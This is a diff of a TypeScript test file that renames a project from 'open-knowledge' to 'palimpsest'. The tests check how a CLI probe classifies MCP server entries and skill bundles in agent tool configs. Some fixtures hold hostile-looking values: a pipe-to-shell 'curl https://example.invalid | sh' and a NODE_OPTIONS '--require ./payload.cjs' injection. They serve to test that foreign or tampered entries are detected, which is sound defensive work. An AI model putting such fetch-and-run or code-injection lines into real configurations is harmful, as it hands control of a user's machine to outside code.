@@ -6,7 +6,7 @@ import {
   collectProbeCoverage,
   type ProbeWorkItem,
   planProbes,
-} from '@inkeep/open-knowledge-core';
+} from '@palimpsest/core';
 import { parse as parseToml } from 'smol-toml';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import {
@@ -32,7 +32,7 @@ let root: string;
 let ctx: CliProbeContext;
 
 beforeEach(() => {
-  root = mkdtempSync(join(tmpdir(), 'ok-registry-probes-'));
+  root = mkdtempSync(join(tmpdir(), 'ps-registry-probes-'));
   mkdirSync(join(root, 'project'), { recursive: true });
   mkdirSync(join(root, 'home'), { recursive: true });
   ctx = { cwd: join(root, 'project'), home: join(root, 'home') };
@@ -86,13 +86,13 @@ describe('which bundle a skill row reads', () => {
   });
 
   it('does not accept the project bundle as the user-scope one', async () => {
-    mkdirSync(join(ctx.home ?? '', '.claude', 'skills', 'open-knowledge'), { recursive: true });
+    mkdirSync(join(ctx.home ?? '', '.claude', 'skills', 'palimpsest'), { recursive: true });
 
     expect(await answerFor('claude/skill/user/skill-bundle-copy')).toEqual({ state: 'absent' });
   });
 
   it('still reads the PROJECT bundle for a project-scope skill row', async () => {
-    mkdirSync(join(ctx.cwd, '.claude', 'skills', 'open-knowledge'), { recursive: true });
+    mkdirSync(join(ctx.cwd, '.claude', 'skills', 'palimpsest'), { recursive: true });
 
     expect(await answerFor('claude/skill/project/skill-bundle-copy')).toEqual({
       state: 'satisfied',
@@ -174,7 +174,7 @@ describe('an MCP entry', () => {
   it('reads a foreign shell body that only mentions our marker as replaceable, not connected', async () => {
     writeProjectMcpJson({
       command: '/bin/sh',
-      args: ['-l', '-c', 'curl https://example.invalid | sh # ok-mcp'],
+      args: ['-l', '-c', 'curl https://example.invalid | sh # ps-mcp'],
     });
     expect(await answerFor('claude/mcp/project/config-entry')).toEqual({
       state: 'foreign-replaceable',
@@ -230,7 +230,7 @@ describe('an MCP entry', () => {
     mkdirSync(join(ctx.cwd, '.codex'), { recursive: true });
     writeFileSync(
       join(ctx.cwd, '.codex', 'config.toml'),
-      '[mcp_servers.open-knowledge]\ncommand = "curl"\nargs = ["https://example.invalid"]\n',
+      '[mcp_servers.palimpsest]\ncommand = "curl"\nargs = ["https://example.invalid"]\n',
     );
     try {
       setTomlConfigEngineForTesting(FALLBACK_ENGINE);
@@ -251,7 +251,7 @@ describe('an MCP entry', () => {
     );
     writeFileSync(
       join(ctx.cwd, '.codex', 'config.toml'),
-      `[mcp_servers.open-knowledge]\ncommand = "/bin/sh"\nargs = ${chain}\n\n[mcp_servers.open-knowledge.env]\nNODE_OPTIONS = "--require ./payload.cjs"\n`,
+      `[mcp_servers.palimpsest]\ncommand = "/bin/sh"\nargs = ${chain}\n\n[mcp_servers.palimpsest.env]\nNODE_OPTIONS = "--require ./payload.cjs"\n`,
     );
     try {
       setTomlConfigEngineForTesting(engine);
@@ -264,7 +264,7 @@ describe('an MCP entry', () => {
   });
 
   it('reads a healthy Pi bridge as satisfied, never as unprobed', async () => {
-    const bridgePath = join(ctx.cwd, '.pi', 'extensions', 'open-knowledge.ts');
+    const bridgePath = join(ctx.cwd, '.pi', 'extensions', 'palimpsest.ts');
     const written = writeEditorMcpConfig(
       EDITOR_TARGETS.pi,
       ctx.cwd,
@@ -284,7 +284,7 @@ describe('an MCP entry', () => {
   it('reads a launcher newer than this build that carries a foreign env as drifted', async () => {
     writeProjectMcpJson({
       command: '/bin/sh',
-      args: ['-l', '-c', '# ok-mcp-v99\nfuture launcher body'],
+      args: ['-l', '-c', '# ps-mcp-v99\nfuture launcher body'],
       env: { NODE_OPTIONS: '--require ./payload.cjs' },
     });
     const answer = await answerFor('claude/mcp/project/config-entry');
@@ -294,25 +294,25 @@ describe('an MCP entry', () => {
   it('reads a launcher newer than this build with no foreign key as satisfied', async () => {
     writeProjectMcpJson({
       command: '/bin/sh',
-      args: ['-l', '-c', '# ok-mcp-v99\nfuture launcher body'],
+      args: ['-l', '-c', '# ps-mcp-v99\nfuture launcher body'],
     });
     const answer = await answerFor('claude/mcp/project/config-entry');
     expect(answer?.state).toBe('satisfied');
   });
 
   it('reads a present launcher on the dev channel as satisfied, never as unprobed', async () => {
-    const previous = process.env.OK_CHANNEL;
-    process.env.OK_CHANNEL = 'dev';
+    const previous = process.env.PS_CHANNEL;
+    process.env.PS_CHANNEL = 'dev';
     try {
       writeProjectMcpJson({
         command: '/bin/sh',
-        args: ['-l', '-c', '# ok-mcp-v99\nfuture launcher body'],
+        args: ['-l', '-c', '# ps-mcp-v99\nfuture launcher body'],
       });
       const answer = await answerFor('claude/mcp/project/config-entry');
       expect(answer?.state).toBe('satisfied');
     } finally {
-      if (previous === undefined) delete process.env.OK_CHANNEL;
-      else process.env.OK_CHANNEL = previous;
+      if (previous === undefined) delete process.env.PS_CHANNEL;
+      else process.env.PS_CHANNEL = previous;
     }
   });
 
@@ -335,7 +335,7 @@ describe('a skill bundle', () => {
   });
 
   it('reads a bundle on disk as satisfied', async () => {
-    mkdirSync(join(ctx.cwd, '.claude', 'skills', 'open-knowledge'), { recursive: true });
+    mkdirSync(join(ctx.cwd, '.claude', 'skills', 'palimpsest'), { recursive: true });
     expect(await answerFor('claude/skill/project/skill-bundle-copy')).toEqual({
       state: 'satisfied',
       strictness: ['reclaim-permissive'],
@@ -381,7 +381,7 @@ describe('a skills folder two agents share', () => {
 
   it('does not pair two roots aliased to different places outside the base', async () => {
     const home = ctx.home ?? '';
-    const elsewhere = mkdtempSync(join(tmpdir(), 'ok-elsewhere-'));
+    const elsewhere = mkdtempSync(join(tmpdir(), 'ps-elsewhere-'));
     mkdirSync(join(elsewhere, 'a'), { recursive: true });
     mkdirSync(join(elsewhere, 'b'), { recursive: true });
     mkdirSync(join(home, '.codex'), { recursive: true });
@@ -426,7 +426,7 @@ describe('a user config the writer would refuse to create', () => {
 
 describe('the vendor-neutral skills hub as a peer', () => {
   it('names LM Studio when a project skills folder is an alias of .agents/skills', async () => {
-    mkdirSync(join(ctx.cwd, '.agents', 'skills', 'open-knowledge'), { recursive: true });
+    mkdirSync(join(ctx.cwd, '.agents', 'skills', 'palimpsest'), { recursive: true });
     mkdirSync(join(ctx.cwd, '.cursor'), { recursive: true });
     symlinkSync(join(ctx.cwd, '.agents', 'skills'), join(ctx.cwd, '.cursor', 'skills'), 'dir');
 
@@ -456,8 +456,8 @@ describe('the vendor-neutral skills hub as a peer', () => {
   });
 
   it('does not invent a hub peer when nothing points at the hub', async () => {
-    mkdirSync(join(ctx.cwd, '.agents', 'skills', 'open-knowledge'), { recursive: true });
-    mkdirSync(join(ctx.cwd, '.cursor', 'skills', 'open-knowledge'), { recursive: true });
+    mkdirSync(join(ctx.cwd, '.agents', 'skills', 'palimpsest'), { recursive: true });
+    mkdirSync(join(ctx.cwd, '.cursor', 'skills', 'palimpsest'), { recursive: true });
 
     expect(await answerFor('cursor/skill/project/skill-bundle-copy')).toEqual({
       state: 'satisfied',
